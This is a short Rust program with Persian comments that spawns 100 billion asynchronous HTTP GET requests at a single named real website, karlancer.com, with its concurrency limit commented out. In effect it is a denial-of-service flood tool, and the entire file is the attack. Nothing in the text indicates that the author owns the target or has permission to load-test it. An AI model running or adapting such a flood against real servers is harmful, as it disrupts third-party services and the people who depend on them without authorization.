use reqwest::Client;

const NUM_REQUESTS: usize = 100_000_000_000; // تعداد درخواست‌ها
// const CONCURRENCY_LIMIT: usize = 100; // تعداد همزمانی

#[tokio::main]
async fn main() -> Result<(), reqwest::Error> {
    let client = Client::new();
    // let semaphore = Arc::new(Semaphore::new(CONCURRENCY_LIMIT));

    let mut handles = vec![];

    for _ in 0..NUM_REQUESTS {
        let client = client.clone();
        // let semaphore = semaphore.clone();

        // let permit = semaphore.acquire().await.unwrap();
        let handle = tokio::spawn(async move {
            let url = "https://karlancer.com"; // آدرس سرور مقصد

            match client.get(url).send().await {
                Ok(response) => {
                    println!("Response: {:?}", response.status());
                }
                Err(e) => {
                    eprintln!("Request failed: {:?}", e);
                }
            }
            // drop(permit); // آزادسازی مجوز پس از اتمام
        });

        handles.push(handle);
    }

    for handle in handles {
        handle.await.unwrap();
    }

    Ok(())
}
